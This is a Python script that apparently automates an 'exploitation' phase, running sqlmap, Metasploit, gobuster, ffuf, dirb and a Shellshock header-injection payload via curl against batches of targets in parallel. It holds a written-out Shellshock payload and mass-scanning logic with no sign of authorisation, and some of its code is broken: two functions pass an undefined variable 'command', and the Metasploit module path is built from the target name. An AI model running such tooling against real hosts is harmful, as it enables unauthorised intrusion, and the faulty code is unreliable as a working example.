import subprocess
import os
import concurrent.futures

def create_target_folder(target):
    folder = f"results/{target}/exploitation"
    os.makedirs(folder, exist_ok=True)
    return folder

def get_wordlist():
    wl = input("Enter path to wordlist (Enter for /usr/share/wordlists/dirb/common.txt): ")
    if not wl:
        wl = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.isfile(wl):
        print("[!] Invalid wordlist, using default.")
        wl = "/usr/share/wordlists/dirb/common.txt"
    return wl

# --- per-tool functions ---

def run_sqlmap(target):
    outfile = f"results/{target}/exploitation/sqlmap.txt"
    cmd = f"sqlmap -u http://{target} --batch --output-dir=results/{target}/exploitation"
    subprocess.run(cmd, shell=True)

def run_metasploit(target):
    outfile = f"results/{target}/exploitation/metasploit.txt"
    cmd = f"msfconsole -q -x 'use exploit/multi/http/{target}; run; exit' > {outfile}"
    subprocess.run(cmd, shell=True)
    
def run_shellshock(target):
    outfile = f"results/{target}/exploitation/shellshock.txt"
    # Example Shellshock exploit against a CGI endpoint
    cmd = (
        f"curl -H 'User-Agent: () {{ :;}}; echo; echo Shellshock' "
        f"http://{target}/cgi-bin/vuln.cgi > {outfile}")
    subprocess.run(command, shell=True)

def run_gobuster(target, wordlist):
    outfile = f"results/{target}/exploitation/gobuster.txt"
    cmd = f"gobuster dir -u http://{target} -w {wordlist} -o {outfile}"
    subprocess.run(cmd, shell=True)

def run_ffuf(target, wordlist):
    outfile = f"results/{target}/exploitation/ffuf.txt"
    cmd = f"ffuf -u http://{target}/FUZZ -w {wordlist} -o {outfile}"
    subprocess.run(cmd, shell=True)
    
def run_dirb(target, wordlist):
    outfile = f"results/{target}/exploitation/dirb.txt"
    cmd = f"dirb http://{target} -w {wordlist} -o {outfile}"
    subprocess.run(command, shell=True)

tools_mapping = {
    "SQLmap":    lambda t, wl=None: run_sqlmap(t),
    "Metasploit":lambda t, wl=None: run_metasploit(t),
    "Shellshock": run_shellshock,
    "Gobuster":  run_gobuster,
    "FFUF":      run_ffuf,
    "Dirb": run_dirb
}

def run_exploitation_tools(target, tools):
    create_target_folder(target)
    wordlist = None
    if any(t in ("Gobuster", "FFUF","Dirb") for t in tools):
        wordlist = get_wordlist()

    with concurrent.futures.ThreadPoolExecutor() as pool:
        futures = {
            pool.submit(tools_mapping[tool], target, wordlist): tool
            for tool in tools if tool in tools_mapping
        }
        for future in concurrent.futures.as_completed(futures):
            name = futures[future]
            try:
                future.result()
                print(f"[+] {name} done on {target}")
            except Exception as e:
                print(f"[!] {name} failed on {target}: {e}")

    print(f"[+] Exploitation finished for {target}")

def run_exploitation_batch(targets, tools):
    """
    targets: iterable of domain/IP strings
    tools:   list of tool names from the menu
    """
    with concurrent.futures.ThreadPoolExecutor() as pool:
        futures = {
            pool.submit(run_exploitation_tools, t.strip(), tools): t.strip()
            for t in targets if t.strip()
        }
        for future in concurrent.futures.as_completed(futures):
            tgt = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"[!] Exploitation on {tgt} raised: {e}")
